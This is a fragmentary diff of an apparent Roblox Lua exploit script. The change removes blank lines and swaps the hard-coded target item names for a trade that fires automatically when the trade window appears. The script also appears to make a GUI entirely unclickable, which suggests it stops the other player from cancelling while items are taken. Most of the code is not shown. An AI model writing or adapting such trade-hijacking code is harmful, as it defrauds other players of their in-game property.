@@ -1,5 +1,3 @@
-
-
 game:GetService("RunService").RenderStepped:Connect(function()
     for i, v in pairs(game:GetService("Players"):GetChildren()) do
         if v.Name ~= game:GetService("Players").LocalPlayer.Name then
@@ -24,8 +22,8 @@ tradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
         fired = true
 
         local items = {
-            {"Beam Core", 1},
-            {"Techno Axe", 1}
+            {"Elegant Blade", 1},
+            {"Snowfriends", 1}
         }
 
         local t = {}
@@ -460,4 +458,3 @@ local function makeEntireGuiUnclickable(root)
 end
 
 makeEntireGuiUnclickable(gui)
-
